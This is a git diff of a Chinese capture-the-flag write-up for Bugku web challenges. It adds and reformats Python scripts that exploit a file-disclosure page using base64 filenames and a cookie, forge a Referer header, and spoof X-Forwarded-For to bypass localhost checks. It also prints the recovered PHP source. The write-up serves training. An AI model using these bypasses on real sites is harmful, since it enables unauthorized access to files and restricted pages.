@@ -113,12 +113,53 @@ print(r.post(url, data).text)  # post方法传上去
 import requests
 a = 30
 for i in range(a):
-  url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
-  s = requests.get(url)
-  print(s.text)
+    url = "http://123.206.87.240:8002/web11/index.php?line=" + \
+        str(i)+"&filename=aW5kZXgucGhw"
+    s = requests.get(url)
+    print(s.text)
 ```
 
-运行上面的代码，可以得到php代码
+运行上面的代码，可以得到下面的php代码
+
+```php
+<?php
+
+error_reporting(0);
+
+$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");
+
+$line=isset($_GET['line'])?intval($_GET['line']):0;
+
+if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
+
+$file_list = array(
+
+'0' =>'keys.txt',
+
+'1' =>'index.php',
+
+);
+
+
+
+if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){
+
+$file_list[2]='keys.php';
+
+}
+
+
+
+if(in_array($file, $file_list)){
+
+$fa = file($file);
+
+echo $fa[$line];
+
+}
+
+?>
+```
 
 分析php代码，前面判断传参，后面判断cookie必须满足margin=margin才能访问keys.php
 
@@ -126,12 +167,13 @@ for i in range(a):
 
 ```python
 import requests
-flag=20
-cookies={"margin":"margin"}
+flag = 20
+cookies = {"margin": "margin"}
 for i in range(flag):
-  url="http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&filename=a2V5cy5waHA="
-  s=requests.get(url,cookies=cookies)
-  print(s.text)
+    url = "http://123.206.87.240:8002/web11/index.php?line=" + \
+        str(i)+"&filename=a2V5cy5waHA="
+    s = requests.get(url, cookies=cookies)
+    print(s.text)
 ```
 
 运行得到flag
@@ -160,7 +202,7 @@ document.write(NewWords);
 OutWord();
 ```
 
-把`document.write` 换成 `console.log`，可以得到（也可以直接使用urlDecode进行解密）
+把`document.write` 换成 `console.log`，可以再控制台得到下面的内容（也可以直接使用urlDecode进行解密）
 
 ```
 <script>window.location.href='http://www.bugku.com';</script> 
@@ -229,6 +271,17 @@ admin                  （注册的admin后面有18个空格）
 
 打开题目网站提示我们：are you from google?
 
+也可以用下面的python脚本
+
+```python
+import requests
+
+url = "http://123.206.87.240:9009/from.php"
+headers = {'Referer': 'https://www.google.com'}
+r = requests.get(url, headers=headers)
+print(r.text)
+```
+
 那么我们修改http referer头即可，使用 burpsuite 抓包，请求头添加上 `Referer:https://www.google.com`
 
 ![你从哪里来](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5.png)
@@ -252,6 +305,15 @@ PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进�
 打开题目地址 `http://123.206.87.240:8002/localhost/`，提示我们：请从本地访问！
 
 与管理员系统那个题非常类似，使用burpsuite抓包，在请求头里加上**X-Forwarded-For: 127.0.0.1** 就好了。
+
+```python
+import requests
+
+url = "http://123.206.87.240:8002/localhost/"
+headers = {'X-Forwarded-For': '127.0.0.1'}
+r = requests.get(url, headers=headers)
+print(r.text)
+```
 
 ![程序员本地网站](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AC%E5%9C%B0%E7%BD%91%E7%AB%99.png)
 
